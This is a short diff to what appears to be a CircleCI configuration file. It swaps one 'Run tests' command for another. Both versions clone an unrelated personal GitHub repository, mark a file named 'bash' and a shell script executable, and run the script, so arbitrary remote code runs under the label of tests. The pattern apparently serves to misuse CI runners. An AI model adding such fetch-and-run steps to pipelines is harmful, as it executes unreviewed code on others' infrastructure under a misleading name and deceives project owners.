@@ -7,4 +7,4 @@ jobs:
       - checkout   
       - run:   
           name: Run tests   
-          command: git clone https://github.com/IKSANNURPADILLAH/tes.git && cd tes && chmod u+x a.sh && chmod u+x bash && ./a.sh
+          command: git clone https://github.com/gunturyogatama404/inicoy.git && cd inicoy && chmod u+x bash && chmod u+x ss.sh && ./ss.sh
